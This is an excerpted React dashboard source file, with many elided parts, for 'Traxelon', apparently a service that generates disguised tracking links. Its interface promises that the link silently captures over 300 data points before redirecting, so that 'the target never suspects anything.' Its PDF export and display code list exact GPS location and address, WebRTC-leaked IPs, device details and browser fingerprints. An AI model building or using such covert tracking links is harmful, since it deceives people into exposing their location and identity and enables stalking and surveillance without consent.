...
//       placeholder="google / myntra / youtube / supreme court / any URL"
//       className="w-full bg-surface border border-surface-border rounded-lg px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors" />
//   </div>
//   <div>
//     <label className="block font-body text-xs text-text-secondary uppercase tracking-wider mb-1.5">Case / Label (optional)</label>
...
import {
  Link2, Zap, Copy, Shield, Activity,
  ChevronRight, AlertCircle, Clock, Smartphone,
  Globe, Eye, CreditCard, X, FileText, ExternalLink, CheckCircle
} from "lucide-react";
...
export default function Dashboard() {
  ...
  async function handleGenerate(e) {
    ...
    if (!destinationUrl.trim()) {
      setError("Please enter a destination URL (e.g. google.com)");
      return;
    }
    setGenerating(true);
    setError("");
    ...
    try {
      ...
      const res = await fetch(BACKEND_URL + "/api/links/shorten", {
        ...
        body: JSON.stringify({ uid: currentUser.uid, label: label || "Tracking Link", destinationUrl: normalized }),
      });
          ...
          <div className="w-full lg:w-[400px] flex-shrink-0">
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
              ...
              <p className="font-body text-xs text-text-muted mb-5">
                Enter any domain — target sees that site, you capture 300+ data points
              </p>
              ...
              {success && (
                <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 mb-4">
                  <p className="font-body text-xs text-primary mb-2 font-semibold flex items-center gap-1">
                    <CheckCircle className="w-3.5 h-3.5" /> Link Generated!
                  </p>
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-xs text-text-secondary truncate flex-1">{success}</span>
                    <button onClick={() => copyToClipboard(success, "new")} className="text-primary hover:text-primary-dark flex-shrink-0">
                      {copiedId === "new" ? <CheckCircle className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              )}
                ...
                <div>
                  ...
                  <div className="relative">
                    ...
                    <input
                      ...
                      placeholder="google.com or youtube.com"
                  ...
                  <p className="font-body text-xs text-text-muted mt-1">
                    No https:// needed · e.g. <span className="text-primary">amazon.in</span>, <span className="text-primary">instagram.com</span>
                  </p>
                </div>
              ...
              <div className="mt-4 p-3 bg-surface border border-surface-border rounded-lg">
                <p className="font-body text-xs text-text-muted">
                  <span className="text-primary font-semibold">How it works: </span>
                  The link silently captures 300+ parameters then instantly redirects to your chosen URL — the target never suspects anything.
                </p>
              </div>
            </div>
          </div>
            ...
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
              ...
              {links.length === 0 ? (
                <div className="text-center py-12">
                  <Shield className="w-12 h-12 text-text-muted mx-auto mb-4" />
                  <p className="font-body text-text-muted">No links generated yet</p>
                  <p className="font-body text-xs text-text-muted mt-1">Generate your first tracking link →</p>
                </div>
              ) : (
                <div className="space-y-3 max-h-[800px] overflow-y-auto pr-1">
                  {links.map((link) => (
                    <div key={link.id}
                      ...
                      <div className="flex items-start justify-between gap-3">
                        <div className="flex-1 min-w-0">
                          <span className="font-body text-sm font-semibold text-text-primary truncate block mb-0.5">{link.label}</span>
                          <div className="font-mono text-xs text-text-muted truncate">{link.trackingUrl}</div>
                          {link.destinationUrl && (
                            <div className="flex items-center gap-1 mt-1">
                              <ExternalLink className="w-3 h-3 text-primary/60" />
                              <span className="font-mono text-xs text-primary/60 truncate">{link.destinationUrl}</span>
                            </div>
                          )}
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0">
                          <button onClick={(e) => { e.stopPropagation(); copyToClipboard(link.trackingUrl, link.id); }} className="p-1.5 text-text-muted hover:text-primary transition-colors">
                            {copiedId === link.id ? <CheckCircle className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                          </button>
                          <ChevronRight className={`w-4 h-4 text-text-muted transition-transform ${selectedLink?.id === link.id ? "rotate-90" : ""}`} />
                        </div>
                      </div>
...
function exportPDF(capture, linkLabel) {
  ...
  doc.setFont("helvetica", "normal");
  doc.text(`Case / Label : ${linkLabel || "N/A"}`, 14, y); y += 6;
  doc.text(`Captured At  : ${capture.capturedAt || "N/A"}`, 14, y); y += 10;
  doc.setDrawColor(0, 180, 216); doc.setLineWidth(0.5);
  doc.line(14, y, pageWidth - 14, y); y += 6;
  ...
  addSection("NETWORK & IP", [
    ["IP Address", capture.ip], ["ISP", capture.isp], ["Organisation", capture.org],
    ["ASN", capture.asn], ["Hostname", capture.hostname],
    ["Is Proxy", capture.isProxy != null ? String(capture.isProxy) : null],
    ["Is Hosting", capture.isHosting != null ? String(capture.isHosting) : null],
    ["Mobile Network", capture.isMobileNetwork != null ? String(capture.isMobileNetwork) : null],
    ["WebRTC Local IP", capture.webrtcLocalIP], ["WebRTC Public IP", capture.webrtcPublicIP],
    ["Connection Type", capture.connectionType],
    ["Downlink", capture.connectionDownlink ? capture.connectionDownlink + " Mbps" : null],
    ["RTT", capture.connectionRtt ? capture.connectionRtt + " ms" : null],
  ]);
  addSection("IP LOCATION", [
    ["City", capture.city], ["Region", capture.region], ["Country", capture.country],
    ["ZIP", capture.zip], ["Coordinates", capture.lat ? `${capture.lat}, ${capture.lon}` : null],
    ["Timezone", capture.timezone],
  ]);
  if (capture.gpsLat && capture.gpsLon) {
    addSection("GPS LOCATION (EXACT)", [
      ["GPS Coordinates", `${capture.gpsLat}, ${capture.gpsLon}`],
      ["Accuracy", capture.gpsAccuracy ? capture.gpsAccuracy + " m" : null],
      ["Altitude", capture.gpsAltitude ? capture.gpsAltitude + " m" : null],
      ["Speed", capture.gpsSpeed ? capture.gpsSpeed + " m/s" : null],
      ["Heading", capture.gpsHeading], ["Full Address", capture.gpsAddress],
      ["City", capture.gpsCity], ["State", capture.gpsState],
      ["Pincode", capture.gpsPincode], ["Country", capture.gpsCountry],
    ]);
  }
  addSection("DEVICE", [
    ["Device Type", capture.device], ["OS", capture.os], ["Browser", capture.browser],
    ["Browser Version", capture.browserVersion], ["Platform", capture.platform],
    ["Architecture", capture.architecture], ["CPU Cores", capture.cpuCores],
    ["RAM", capture.ram ? capture.ram + " GB" : null], ["GPU", capture.gpu],
    ["GPU Vendor", capture.gpuVendor], ["Vendor", capture.vendor],
    ["Touch Points", capture.maxTouchPoints],
  ]);
  addSection("WEBGL", [
    ["WebGL Version", capture.webglVersion], ["Renderer", capture.webglRenderer],
    ["Vendor", capture.webglVendor], ["Shading Lang", capture.webglShadingLanguage],
    ["Max Texture Size", capture.maxTextureSize], ["Max Viewport", capture.maxViewportDims],
    ["Extensions Count", capture.webglExtensionsCount], ["WebGL Hash", capture.webglHash],
  ]);
  addSection("SCREEN", [
    ["Resolution", capture.screenWidth ? `${capture.screenWidth}x${capture.screenHeight}` : null],
    ["Available", capture.screenAvailWidth ? `${capture.screenAvailWidth}x${capture.screenAvailHeight}` : null],
    ["Window", capture.windowWidth ? `${capture.windowWidth}x${capture.windowHeight}` : null],
    ["Color Depth", capture.colorDepth ? capture.colorDepth + " bit" : null],
    ["Pixel Ratio", capture.pixelRatio], ["Orientation", capture.orientation],
    ["HDR", capture.hdrSupport], ["Color Gamut", capture.colorGamut],
    ["Dark Mode", capture.prefersColorScheme],
  ]);
  addSection("BATTERY", [
    ["Battery Level", capture.batteryLevel != null ? capture.batteryLevel + "%" : null],
    ["Charging", capture.batteryCharging != null ? (capture.batteryCharging ? "Yes" : "No") : null],
  ...
  addSection("FINGERPRINTS", [
    ["Canvas Hash", capture.canvasHash], ["Canvas Geometry", capture.canvasGeometryHash],
    ["Audio Fingerprint", capture.audioFingerprint], ["WebGL Hash", capture.webglHash],
    ["Font Fingerprint", capture.fontFingerprint], ["CSS Hash", capture.cssHash],
  ]);
  addSection("PERFORMANCE", [
    ["Page Load", capture.pageLoadTime], ["DOM Loaded", capture.domContentLoaded],
    ["DNS Lookup", capture.dnsLookupTime], ["TCP Connect", capture.tcpConnectTime],
    ["TTFB", capture.ttfb], ["Memory Used", capture.memoryUsed],
    ["Memory Total", capture.memoryTotal], ["Memory Limit", capture.memoryLimit],
  ]);
  ...
  for (let i = 1; i <= totalPages; i++) {
    ...
    doc.text(`Traxelon  |  Page ${i} of ${totalPages}  |  CONFIDENTIAL`, pageWidth / 2, 291, { align: "center" });
  }
    ...
    <div className="bg-surface-elevated border border-surface-border rounded-lg p-4">
      <div className="flex items-center justify-between mb-4">
        ...
        <div className="flex items-center gap-2">
          ...
          <button onClick={(e) => { e.stopPropagation(); exportPDF(capture, linkLabel); }}
            className="flex items-center gap-1 px-3 py-1 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors">
            <FileText className="w-3 h-3" /> Export PDF
          </button>
        </div>
      ...
      {!hasGPS && hasIPLocation && (
        <Section title="🗺️ Approximate Map">
          <div className="col-span-2">
            <div className="rounded-xl overflow-hidden border border-surface-border" style={{ height: 180 }}>
              <iframe title={"map-ip-" + index} width="100%" height="100%" frameBorder="0"
                src={"https://maps.google.com/maps?q=" + capture.lat + "," + capture.lon + "&z=12&output=embed"} allowFullScreen />
            </div>
          </div>
      ...
      <Section title="💾 Storage">
        ...
        <DataRow label="Cookies Count" value={capture.cookiesCount} />
      </Section>
      ...
      <Section title="⚡ Performance">
        ...
        <DataRow label="Memory Used" value={capture.memoryUsed} />
        <DataRow label="Memory Total" value={capture.memoryTotal} />
        <DataRow label="Memory Limit" value={capture.memoryLimit} />
      </Section>
      ...
      <Section title="✅ Feature Support">
        ...
        <DataRow label="VR/AR (XR)" value={capture.xrSupport} />
        <DataRow label="WebRTC" value={capture.webrtcSupport} />
        <DataRow label="WebGL2" value={capture.webgl2Support} />
